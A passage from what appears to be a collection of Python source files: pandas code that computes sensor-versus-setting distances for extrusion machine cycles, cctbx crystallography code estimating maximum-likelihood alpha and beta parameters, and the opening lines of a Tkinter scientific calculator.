calc_distance(i, settings_)\n        else:\n            settings_ = i\n            wtc_wtc = i\n            df_cycle_main['WTC'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['dieTempZ1']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['dieTempZ1'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['dieTempZ1'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['dieTempZ2']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['dieTempZ2'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['dieTempZ2'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['dieTempZ3']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['dieTempZ3'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['dieTempZ3'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['headTempZ1']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['headTempZ1'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['headTempZ1'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['headTempZ2']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['headTempZ2'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['headTempZ2'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['headTempZ3']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['headTempZ3'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['headTempZ3'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['tempFZ']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['tempFZ'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['tempFZ'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['tempZA1']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['tempZA1'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['tempZA1'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['tempZA10']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['tempZA10'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['tempZA10'][m] = calc_distance(i, settings_)\n\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['tempZA11']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['tempZA11'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['tempZA11'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['tempZA2']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['tempZA2'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['tempZA2'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['tempZA3']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['tempZA3'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['tempZA3'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    temp_temp = []\n    for i in df_cycle_main['meltTemp']:\n        if m != 0:\n            settings_ = temp_temp\n            temp_temp = i\n            df_cycle_main['meltTemp'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            temp_temp = i\n            df_cycle_main['meltTemp'][m] = calc_distance(i, settings_)\n        m += 1\n    del settings_\n    del temp_temp\n    end = time.time()\n    print(\"Calculate Distances\")\n    print(end - start)\n    return df_cycle_main\n\n\n# Create DataFrame to settings\ndef create_dataframe_settings(df_cycle_main, df_setting):\n    start = time.time()\n    ex_default = calc_average(df_cycle_main['exPressure'])\n    m = 0\n    for i in df_cycle_main['exPressure']:\n        df_cycle_main['exPressure'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    ex_default = calc_average(df_cycle_main['exSpeed'])\n    m = 0\n    for i in df_cycle_main['exSpeed']:\n        df_cycle_main['exSpeed'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    ex_default = calc_average(df_cycle_main['exTorque'])\n    m = 0\n    for i in df_cycle_main['exTorque']:\n        df_cycle_main['exTorque'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['RWTC1']:\n        df_cycle_main['RWTC1'][m] = calc_distance(i, df_setting['setRWTC1'][m])\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['RWTC2']:\n        df_cycle_main['RWTC2'][m] = calc_distance(i, df_setting['setRWTC2'][m])\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['suction']:\n        df_cycle_main['suction'][m] = calc_distance(i, df_setting['setSuction'][m])\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['WTC']:\n        df_cycle_main['WTC'][m] = calc_distance(i, df_setting['setWTC'][m])\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['dieTempZ1']:\n        settings_ = [df_setting['setDieTempZ1'][m]] * len(i)\n        df_cycle_main['dieTempZ1'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['dieTempZ2']:\n        settings_ = [df_setting['setDieTempZ2'][m]] * len(i)\n        df_cycle_main['dieTempZ2'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['dieTempZ3']:\n        settings_ = [df_setting['setDieTempZ3'][m]] * len(i)\n        df_cycle_main['dieTempZ3'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['headTempZ1']:\n        settings_ = [df_setting['setHeadTempZ1'][m]] * len(i)\n        df_cycle_main['headTempZ1'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['headTempZ2']:\n        settings_ = [df_setting['setHeadTempZ2'][m]] * len(i)\n        df_cycle_main['headTempZ2'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['headTempZ3']:\n        settings_ = [df_setting['setHeadTempZ3'][m]] * len(i)\n        df_cycle_main['headTempZ3'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['tempFZ']:\n        settings_ = [df_setting['setTempFZ'][m]] * len(i)\n        df_cycle_main['tempFZ'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['tempZA1']:\n        settings_ = [df_setting['setTempZA1'][m]] * len(i)\n        df_cycle_main['tempZA1'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['tempZA10']:\n        settings_ = [df_setting['setTempZA10'][m]] * len(i)\n        df_cycle_main['tempZA10'][m] = calc_distance(i, settings_)\n\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['tempZA11']:\n        settings_ = [df_setting['setTempZA11'][m]] * len(i)\n        df_cycle_main['tempZA11'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['tempZA2']:\n        settings_ = [df_setting['setTempZA2'][m]] * len(i)\n        df_cycle_main['tempZA2'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['tempZA3']:\n        settings_ = [df_setting['setTempZA3'][m]] * len(i)\n        df_cycle_main['tempZA3'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    for i in df_cycle_main['meltTemp']:\n        settings_ = [df_setting['setMeltTemp'][m]] * len(i)\n        df_cycle_main['meltTemp'][m] = calc_distance(i, settings_)\n        m += 1\n    del settings_\n    del ex_default\n    end = time.time()\n    print(\"Calculate Distances\")\n    print(end - start)\n    return df_cycle_main\n\n\n# Reading Json File Function\ndef process_cycles(cycles_, method):\n    # Build Vectors\n    settings = {}\n    cycles = {}\n    meta = {}\n    for i in cycles_:\n        z = vars(i)\n        m = 0\n        setting = {}\n        cycle = {}\n        for j in z:\n            m += 1\n            if j[0:3] == 'set':\n                setting[j] = z[j]\n            elif m > 1:\n                cycle[j] = z[j]\n            else:\n                meta[j] = z[j]\n        settings['C{}'.format(i.cycleNumber)] = setting\n        cycles['C{}'.format(i.cycleNumber)] = cycle\n    df_cycle_main = pd.DataFrame(cycles)\n    df_cycle_main = df_cycle_main.transpose()\n    df_setting = pd.DataFrame(settings)\n    df_setting = df_setting.transpose()\n    del cycles\n    del meta\n    del settings\n    del cycles_\n    df_full = df_cycle_main.merge(df_setting, left_index=True, right_index=True)\n\n    if method == 1:\n        df_cycle_main = create_dataframe(df_cycle_main)\n    elif method == 2:\n        df_cycle_main = create_dataframe_av(df_cycle_main)\n    elif method == 3:\n        df_cycle_main = create_dataframe_previous_three(df_cycle_main)\n    elif method == 4:\n        df_cycle_main = create_dataframe_settings(df_cycle_main, df_setting)\n    elif method == 5:\n        df_product = transform_product(df_cycle_main)\n        df_cycle_main = create_dataframe_av(df_product)\n    elif method == 6:\n        df_product = transform_product_selective(df_cycle_main)\n        df_cycle_main = create_dataframe_av(df_product)\n    df_setting = ''\n    df_product = ''\n    print(df_product, df_setting)\n    return df_cycle_main, df_full\n\n\n# noinspection PyTypeChecker\ndef read_cycles(folder, method):\n    start = time.time()\n    cycles_ = []\n    json_folder_path = os.path.join(folder)\n    json_files = [files for files in os.listdir(json_folder_path) if files.endswith('.json')]\n    json_files.sort()\n    for json_file in json_files:\n        json_file_path = os.path.join(json_folder_path, json_file)\n        with open(json_file_path, \"r\") as file:\n            cycle_file = json.load(file)\n            if 151.0 > float(cycle_file['CycleTotalTime']) > 49.0:\n                cycle_data = Cycle(cycle_file)\n                cycles_.append(cycle_data)\n    end = time.time()\n    print(\"Create Cycle objects:\")\n    print(end - start)\n    df_cycle_main, df_full = process_cycles(cycles_, method)\n    del cycles_\n    return df_cycle_main, df_full\n\n\ndef read_cycles_(list_of_contents, list_of_names, list_of_dates, method):\n    start = time.time()\n    cycles_ = []\n    if list_of_contents is not None:\n        for contents, filename, date in zip(list_of_contents, list_of_names, list_of_dates):\n            if 'json' in filename:\n                content_type, content_string = contents.split(',')\n                decoded = base64.b64decode(content_string)\n                data = json.load(io.StringIO(decoded.decode('utf-8')))\n                if 151.0 > float(data['CycleTotalTime']) > 49.0:\n                    cycle_data = Cycle(data)\n                    cycles_.append(cycle_data)\n    end = time.time()\n    print(\"Create Cycle objects:\")\n    print(end - start)\n    df_cycle_main, df_full = process_cycles(cycles_, method)\n\n    del list_of_contents\n    del list_of_names\n    del list_of_dates\n    del cycles_\n    return df_cycle_main, df_full\n\n\ndef update_method(df_full, method):\n    df_cycle_main = df_full.iloc[:, 0:24]\n    df_setting = df_full.iloc[:, 24:]\n    if method == 1:\n        df_cycle_main = create_dataframe(df_cycle_main)\n    elif method == 2:\n        df_cycle_main = create_dataframe_av(df_cycle_main)\n    elif method == 3:\n        df_cycle_main = create_dataframe_previous_three(df_cycle_main)\n    elif method == 4:\n        df_cycle_main = create_dataframe_settings(df_cycle_main, df_setting)\n    elif method == 5:\n        df_product = transform_product(df_cycle_main)\n        df_cycle_main = create_dataframe_av(df_product)\n    elif method == 6:\n        df_product = transform_product_selective(df_cycle_main)\n        df_cycle_main = create_dataframe_av(df_product)\n    del df_full\n    del df_setting\n    return df_cycle_main\n", "317": "from __future__ import absolute_import, division, print_function\nimport math\nfrom cctbx.array_family import flex\nfrom cctbx.eltbx.xray_scattering import wk1995\nfrom scitbx.math import bessel_i1_over_i0\nfrom mmtbx import max_lik\nimport math\nfrom cctbx.array_family import flex\nfrom cctbx import miller\nfrom libtbx import adopt_init_args\nimport iotbx.phil\nfrom six.moves import zip\nfrom six.moves import range\n\nalpha_beta_params = iotbx.phil.parse(\"\"\"\\\n  free_reflections_per_bin = 140\n    .type = int\n  number_of_macromolecule_atoms_absent = 225\n    .type = int\n  n_atoms_included = 0\n    .type = int\n  bf_atoms_absent = 15.0\n    .type = float\n  final_error = 0.0\n    .type = float\n  absent_atom_type = \"O\"\n    .type = str\n  method = *est calc\n    .type = choice\n  estimation_algorithm = *analytical iterative\n    .type = choice\n  verbose = -1\n    .type = int\n  interpolation = True\n    .type = bool\n  number_of_waters_absent = 613\n    .type = float\n\"\"\")\n\ndef fo_fc_alpha_over_eps_beta(f_obs, f_model, alpha, beta):\n  # Parameter \"t\". The coefficient 2 is already included, so for example\n  # fom = th(t) or I1(t)/I0(t) depending on cf.\n  return max_lik.fo_fc_alpha_over_eps_beta(\n    f_obs          = f_obs.data(),\n    f_model        = flex.abs(f_model.data()),\n    alpha          = alpha.data(),\n    beta           = beta.data(),\n    space_group    = f_obs.space_group(),\n    miller_indices = f_obs.indices())\n\ndef figures_of_merit_(f_obs,\n                      f_calc,\n                      alpha,\n                      beta):\n  return max_lik.fom_and_phase_error(f_obs          = f_obs.data(),\n                                     f_model        = f_calc.data(),\n                                     alpha          = alpha,\n                                     beta           = beta,\n                                     space_group    = f_obs.space_group(),\n                                     miller_indices = f_obs.indices()).fom()\n\ndef phase_error(f_obs,\n                f_calc,\n                alpha,\n                beta):\n  return max_lik.fom_and_phase_error(\n                                f_obs          = f_obs.data(),\n                                f_model        = f_calc.data(),\n                                alpha          = alpha,\n                                beta           = beta,\n                                space_group    = f_obs.space_group(),\n                                miller_indices = f_obs.indices()).phase_error()\n\ndef fom(t,lcent):\n    #\n    # calculates the ratio I1(2t)/I0(2t) if lcent=0 and th(t) in other cases\n    # I1() - Modified Bessel Function of 1 order\n    # I0() - Modified Bessel Function of 0 order\n    #\n    if lcent == 0:\n       result = bessel_i1_over_i0(2.*t)\n    else:\n       result = math.tanh(t)\n    return result\n###############################################################################\nclass alpha_beta_calc(object):\n\n  def __init__(self,f,\n                    n_atoms_absent,\n                    n_atoms_included,\n                    bf_atoms_absent,\n                    final_error,\n                    absent_atom_type):\n    #\n    #   ss=s**2 = (2*sin(teta)/lambda)**2 for the given reflection;\n    #   final_error - desired mean error in atomic positions (in A);\n    #                 it must be specified as 0., if the user has\n    #                 no idea about its other value;\n    #   n_atoms_included - an approximate number of non-hydrogen atoms in\n    #                      the ASYMMETRIC PART OF THE UNIT CELL, which\n    #                      are INCLUDED into the current model for refinement;\n    #   n_atoms_absent - an approximate number of non-hydrogen atoms in\n    #                    the ASYMMETRIC PART OF THE UNIT CELL, which are\n    #                    NOT INCLUDED into the current model for refinement;\n    #.....................................................................\n    # P.Afonine, V.Lunin & A.Urzhumtsev.(2003).J.Appl.Cryst.36,158-159\n    #\n    self.f = f\n    assert n_atoms_absent >= 0\n    assert n_atoms_included >= 0\n    assert f.size() > 0\n    self.ss = 1./flex.pow2(f.d_spacings().data())\n    assert self.ss.size() == f.data().size()\n    self.nsym = f.space_group().order_z()\n    assert self.nsym >= 1\n    self.n_atoms_absent   = n_atoms_absent\n    self.n_atoms_included = n_atoms_included\n    self.bf_atoms_absent = bf_atoms_absent\n    if final_error is None : final_error = 0.0\n    self.final_error = final_error\n    assert final_error >= 0.0\n    if absent_atom_type is None : absent_atom_type=\"C\"\n    self.absent_atom_type = absent_atom_type\n\n  def alpha_beta(self):\n    #\n    # alpha, beta by formulas\n    #.........................................................................\n    # V.Lunin & T.Skovoroda. Acta Cryst. (1995). A51, 880-887\n    # A.Urzhumtsev, T.Skovoroda & V.Lunin. J. Appl. Cryst. (1996). 29, 741-744\n    # V.Lunin, P.Afonine & A.Urzhumtsev. Acta Cryst. (2002). A58, 270-282\n    #\n    alpha=[] ; beta=[]\n    n_part = self.nsym * self.n_atoms_included\n    n_lost = self.nsym * self.n_atoms_absent\n    for ssi in self.ss:\n       ak = math.exp(-0.25*ssi*(self.final_error**2)*(math.pi**3))\n       alpha.append( ak )\n       fact = self.form_factor(ssi)*math.exp(-self.bf_atoms_absent/4.0*ssi)\n       beta.append(((1.0-ak**2)*n_part+n_lost)*fact**2)\n    alpha_data = flex.double(alpha)\n    beta_data = flex.double(beta)\n    alpha = miller.array(miller_set = self.f, data = alpha_data)\n    beta  = miller.array(miller_set = self.f, data = beta_data)\n    return alpha, beta\n\n  def form_factor(self,ss):\n    #\n    # W & K form-factor of atom C\n    #\n    table=wk1995(self.absent_atom_type).fetch()\n    a_wk=table.array_of_a()\n    b_wk=table.array_of_b()\n    c_wk=table.c()\n    result_wk=c_wk\n    for i in range(5):\n       result_wk += a_wk[i]*math.exp(-b_wk[i]*ss/4.0)\n    return result_wk\n\n###############################################################################\nclass alpha_beta_est_manager(object):\n\n  def __init__(self,f_obs,\n                    f_calc,\n                    free_reflections_per_bin,\n                    flags,\n                    interpolation,\n                    epsilons):\n    adopt_init_args(self, locals())\n    #\n    # icent - array contains 0 for acentric reflections and >0 integer\n    #         for centric reflections\n    # epsilon  - array contains the correction factors for intensity\n    #         they are equal to how many times the transposed symmetry\n    #         matrixes leaves the reciprocal space point at the same place\n    # icont - array contains the control set; the value 1 means that\n    #         this reflection will be used in the calculation of\n    #         likelihood function;\n    # f_calc - array of calculated magnitude values\n    # f_obs  - array of experimental magnitude values\n    # free_reflections_per_bin - minimal number of reflections in given\n    #                    resolution zone used for alpha,beta calculation\n    # V.Lunin & T.Skovoroda. Acta Cryst. (1995). A51, 880-887\n    # P.Afonine, V.Lunin & A.Urzhumtsev.(2003).J.Appl.Cryst.36,158-159\n    #\n    assert len(self.flags) == self.f_obs.data().size()\n    assert self.f_obs.data().size() == self.f_calc.data().size()\n    assert self.f_obs.data().size() == self.epsilons.size()\n    assert self.f_calc.indices().all_eq(self.f_obs.indices()) == 1\n    self.f_calc = abs(self.f_calc)\n    if(self.flags.count(True) > 0):\n      if free_reflections_per_bin > flags.count(True):\n         self.free_reflections_per_bin = flags.count(True)\n      self.f_obs_test  = self.f_obs.select(self.flags)\n      self.f_calc_test = self.f_calc.select(self.flags)\n      self.epsilons_test = self.epsilons.select(self.flags)\n    if(self.flags.count(True) == 0):\n      self.f_obs_test  = self.f_obs.select(~self.flags)\n      self.f_calc_test = self.f_calc.select(~self.flags)\n      self.epsilons_test = self.epsilons.select(~self.flags)\n    self.f_obs_test.setup_binner_counting_sorted(\n      reflections_per_bin= self.free_reflections_per_bin)\n    self.fo_test_sets = []\n    self.fm_test_sets = []\n    self.indices_sets = []\n    self.epsilons_sets = []\n    for i_bin in self.f_obs_test.binner().range_used():\n       sel = self.f_obs_test.binner().selection(i_bin)\n       sel_f_obs_test = self.f_obs_test.select(sel)\n       sel_f_calc_test = self.f_calc_test.select(sel)\n       sel_epsilons_test = self.epsilons_test.select(sel)\n       if(sel.count(True) > 0): # XXX I do not understand why it can be 0 (in rare cases)\n         self.fo_test_sets.append(sel_f_obs_test.data())\n         self.fm_test_sets.append(sel_f_calc_test.data())\n         self.indices_sets.append(sel_f_obs_test.indices())\n         self.epsilons_sets.append(sel_epsilons_test)\n    for a,b,c in zip(self.fo_test_sets, self.fm_test_sets, self.indices_sets):\n      assert a.size() == b.size() == c.size() != 0\n    obj = max_lik.alpha_beta_est(fo_test     = self.fo_test_sets,\n                                 fm_test     = self.fm_test_sets,\n                                 indices     = self.indices_sets,\n                                 epsilons    = self.epsilons_sets,\n                                 space_group = self.f_obs_test.space_group())\n    self.alpha_in_zones, self.beta_in_zones = obj.alpha(), obj.beta()\n    self.alpha, self.beta = self.alpha_beta_for_each_reflection()\n\n  def alpha_beta(self):\n    return self.alpha, self.beta\n\n  def smooth(self,x):\n    if len(x) > 1:\n      x1=x[0]\n      x2=x[1]\n      for i in range(1,len(x)-1,1):\n         x3=x[i+1]\n         tmp = (x1+x2+x3)/3.0\n         x[i]=tmp\n         x1=x2\n         x2=x3\n      for i in range(0,len(x),1):\n        if(x[i] < 0.01):\n          try: x[i] = x[i-1]\n          except Exception: x[i] = x[i+1]\n\n    return x\n\n  def alpha_beta_for_each_reflection(self, f_obs=None):\n    if f_obs is None: f_obs = self.f_obs\n    alpha = flex.double(f_obs.size())\n    beta = flex.double(f_obs.size())\n    f_obs.setup_binner(n_bins= len(self.alpha_in_zones))\n    binner = f_obs.binner()\n    if(self.interpolation == True):\n      az = flex.double(self.smooth(self.alpha_in_zones))\n      bz = flex.double(self.smooth(self.beta_in_zones) )\n      alpha = binner.interpolate(az, 0)\n      beta  = binner.interpolate(bz, 0)\n    elif(self.interpolation == False):\n      for i_bin, az, bz in zip(binner.range_used(),self.alpha_in_zones,\n                               self.beta_in_zones):\n        sel = binner.selection(i_bin)\n        alpha.set_selected(sel, az)\n        beta.set_selected(sel, bz)\n    alpha = miller.array(miller_set=f_obs, data=alpha)\n    beta = miller.array(miller_set=f_obs, data=beta)\n    return alpha, beta\n\n\nclass alpha_beta(object):\n  def __init__(self, f_obs            = None,\n                     f_calc           = None,\n                     free_reflections_per_bin = None,\n                     flags            = None,\n                     verbose          = None,\n                     n_atoms_absent   = None,\n                     n_atoms_included = None,\n                     bf_atoms_absent  = None,\n                     final_error      = None,\n                     absent_atom_type = None,\n                     method           = None,\n                     interpolation    = None):\n    adopt_init_args(self, locals())\n    assert self.method == \"calc\" or self.method == \"est\" or \\\n           self.method == \"calc_and_est\"\n    assert self.verbose is not None\n    if (self.method == \"est\"):\n      assert self.interpolation is not None\n      assert self.f_obs.data().size() == self.f_calc.data().size()\n      assert self.flags.size() == self.f_obs.data().size()\n      assert self.f_calc.indices().all_eq(self.f_obs.indices()) == 1\n      self.alpha, self.beta = alpha_beta_est_manager(\n        f_obs           = self.f_obs,\n        f_calc          = abs(self.f_calc),\n        free_reflections_per_bin = self.free_reflections_per_bin,\n        flags           = self.flags,\n        interpolation   = self.interpolation).alpha_beta()\n    if (self.method == \"calc\"):\n      assert self.f_obs is not None or self.f_calc is not None\n      if (self.f_obs is not None): f = self.f_obs\n      else: f = self.f_calc\n      assert self.n_atoms_absent is not None\n      assert self.n_atoms_included is not None\n      assert self.bf_atoms_absent is not None\n      assert self.absent_atom_type is not None\n      self.alpha, self.beta = alpha_beta_calc(\n                                    f                = f,\n                                    n_atoms_absent   = self.n_atoms_absent,\n                                    n_atoms_included = self.n_atoms_included,\n                                    bf_atoms_absent  = self.bf_atoms_absent,\n                                    final_error      = self.final_error,\n                                    absent_atom_type = self.absent_atom_type).alpha_beta()\n    if (self.method == \"calc_and_est\"):\n      assert self.interpolation    is not None\n      assert self.f_obs            is not None\n      assert self.f_calc           is not None\n      assert self.free_reflections_per_bin is not None\n      assert self.flags            is not None\n      assert self.n_atoms_absent   is not None\n      assert self.n_atoms_included is not None\n      assert self.bf_atoms_absent  is not None\n      assert self.final_error      is not None\n      assert self.absent_atom_type is not None\n      assert self.f_obs.data().size() == self.f_calc.data().size() == \\\n             self.flags.size()\n      assert self.f_calc.indices().all_eq(self.f_obs.indices()) == 1\n      self.alpha_calc, self.beta_calc = alpha_beta_calc(\n                                    f                = self.f_obs,\n                                    n_atoms_absent   = self.n_atoms_absent,\n                                    n_atoms_included = self.n_atoms_included,\n                                    bf_atoms_absent  = self.bf_atoms_absent,\n                                    final_error      = self.final_error,\n                                    absent_atom_type = self.absent_atom_type).alpha_beta()\n      self.alpha_est, self.beta_est = alpha_beta_est(\n        f_obs           = self.f_obs,\n        f_calc          = abs(self.f_calc),\n        free_reflections_per_bin = self.free_reflections_per_bin,\n        flags           = self.flags,\n        interpolation   = self.interpolation).alpha_beta()\n      alpha_calc_ma = miller.array(miller_set= self.f_obs,data= self.alpha_calc)\n      beta_calc_ma  = miller.array(miller_set= self.f_obs,data= self.beta_calc)\n      alpha_est_ma  = miller.array(miller_set= self.f_obs,data= self.alpha_est)\n      beta_est_ma   = miller.array(miller_set= self.f_obs,data= self.beta_est)\n\n      ss = 1./flex.pow2(alpha_calc_ma.d_spacings().data())\n      omega_calc = []\n      omega_est  = []\n      for ac,ae,ssi in zip(self.alpha_calc, self.alpha_est,ss):\n        if(ac > 1.0): ac = 1.0\n        if(ae > 1.0): ae = 1.0\n        if(ac <= 0.0): ac = 1.e-6\n        if(ae <= 0.0): ae = 1.e-6\n        coeff = -4./(math.pi**3*ssi)\n        omega_calc.append( math.sqrt( math.log(ac) * coeff ) )\n        omega_est.append( math.sqrt( math.log(ae) * coeff ) )\n      omega_calc_ma = miller.array(miller_set= self.f_obs,data= flex.double(omega_calc))\n      omega_est_ma  = miller.array(miller_set= self.f_obs,data= flex.double(omega_est))\n\n      if(self.flags.count(True) > 0):\n        omega_calc_ma_test = omega_calc_ma.select(self.flags)\n        omega_est_ma_test  = omega_est_ma.select(self.flags)\n        alpha_calc_ma_test= alpha_calc_ma.select(self.flags)\n        beta_calc_ma_test= beta_calc_ma.select(self.flags)\n        alpha_est_ma_test= alpha_est_ma.select(self.flags)\n        beta_est_ma_test= beta_est_ma.select(self.flags)\n      if(self.flags.count(True) == 0):\n        omega_calc_ma_test = omega_calc_ma.select(~self.flags)\n        omega_est_ma_test  = omega_est_ma.select(~self.flags)\n        alpha_calc_ma_test= alpha_calc_ma.select(~self.flags)\n        beta_calc_ma_test= beta_calc_ma.select(~self.flags)\n        alpha_est_ma_test= alpha_est_ma.select(~self.flags)\n        beta_est_ma_test= beta_est_ma.select(~self.flags)\n\n      alpha_calc_ma_test.setup_binner(\n        reflections_per_bin = self.free_reflections_per_bin)\n      beta_calc_ma_test.use_binning_of(alpha_calc_ma_test)\n      alpha_est_ma_test.use_binning_of(alpha_calc_ma_test)\n      beta_est_ma_test.use_binning_of(alpha_calc_ma_test)\n      omega_calc_ma_test.use_binning_of(alpha_calc_ma_test)\n      omega_est_ma_test.use_binning_of(alpha_calc_ma_test)\n\n      print(\"    Resolution           Estimated and calculated alpha, beta and model error\")\n      print(\"   d1        d2    nref alpha_e    beta_e    err_e alpha_c   beta_c     err_c\")\n      for i_bin in alpha_calc_ma_test.binner().range_used():\n        sel = alpha_calc_ma_test.binner().selection(i_bin)\n        sel_alpha_calc_ma_test = alpha_calc_ma_test.select(sel)\n        sel_beta_calc_ma_test  = beta_calc_ma_test.select(sel)\n        sel_alpha_est_ma_test  = alpha_est_ma_test.select(sel)\n        sel_beta_est_ma_test   = beta_est_ma_test.select(sel)\n        sel_omega_calc_ma_test = omega_calc_ma_test.select(sel)\n        sel_omega_est_ma_test  = omega_est_ma_test.select(sel)\n        size = sel_alpha_calc_ma_test.data().size()\n        if(self.interpolation == False):\n          i=0\n          while i < size:\n            v_alpha_est = sel_alpha_est_ma_test.data()[i]\n            if(sel_alpha_est_ma_test.data().count(v_alpha_est) > size/2):\n              v_beta_est = sel_beta_est_ma_test.data()[i]\n              if(sel_beta_est_ma_test.data().count(v_beta_est) > size/2): break\n            i+=1\n        elif(self.interpolation == True):\n          v_alpha_est = flex.mean(sel_alpha_est_ma_test.data())\n          v_beta_est  = flex.mean(sel_beta_est_ma_test.data())\n        alpha_calc = flex.mean(sel_alpha_calc_ma_test.data())\n        beta_calc  = flex.mean(sel_beta_calc_ma_test.data())\n        omega_c = flex.mean(sel_omega_calc_ma_test.data())\n        omega_e = flex.mean(sel_omega_est_ma_test.data())\n        d1 = alpha_calc_ma_test.binner().bin_d_range(i_bin)[0]\n        d2 = alpha_calc_ma_test.binner().bin_d_range(i_bin)[1]\n        print(\"%8.4f %8.4f %5d %6.5f %12.3f %5.3f %6.5f %12.3f %5.3f\" % \\\n          (d1,d2,size,v_alpha_est,\\\n           v_beta_est,omega_e,alpha_calc,beta_calc,omega_c))\n\n  def alpha_beta(self):\n    return self.alpha, self.beta\n\ndef sigma_miss(miller_array, n_atoms_absent, bf_atoms_absent, absent_atom_type):\n  result = flex.double()\n  if(n_atoms_absent == 0): return flex.double(miller_array.indices().size(), 0)\n  def form_factor(ssi, absent_atom_type):\n    table=wk1995(absent_atom_type).fetch()\n    a_wk=table.array_of_a()\n    b_wk=table.array_of_b()\n    c_wk=table.c()\n    result_wk=c_wk\n    for i in range(5):\n      result_wk += a_wk[i]*math.exp(-b_wk[i]*ssi/4.0)\n    return result_wk\n  ss = 1./flex.pow2(miller_array.d_spacings().data())\n  nsym = miller_array.space_group().order_z()\n  #\n  for ssi in ss:\n     fact = form_factor(ssi, absent_atom_type)*math.exp(-bf_atoms_absent/4.0*ssi)\n     result.append(fact * nsym * n_atoms_absent)\n  return result\n", "318": "#======================#\n#  Tkinter Scientific Calculator  #\n#----------------------#\n# By, SUDEEP A GOWDA #\n# UNIVERSITY  VISVESVARAYA COLLEGE  OF ENGINEERING #\n#  MECHANICAL ENGINEER , BANGALORE UNIVERSITY    #\n#======================#\n\n# Import packages\nfrom tkinter import *\nimport math\nimport numpy as np\n\n'''\nFunctions\n'''\n# Function to add in the entry of text display\ndef button_click(char):\n    global calc_operator\n    calc_operator += str(char)\n    text_input.set(calc_operator)\n\n# Function to clear the whole entry of text display\ndef button_clear_all():\n    global calc_operator\n    calc_operator = \"\"\n    text_input.set(\"\")\n\n# Function to delete one by one from the last in the entry of text display\ndef 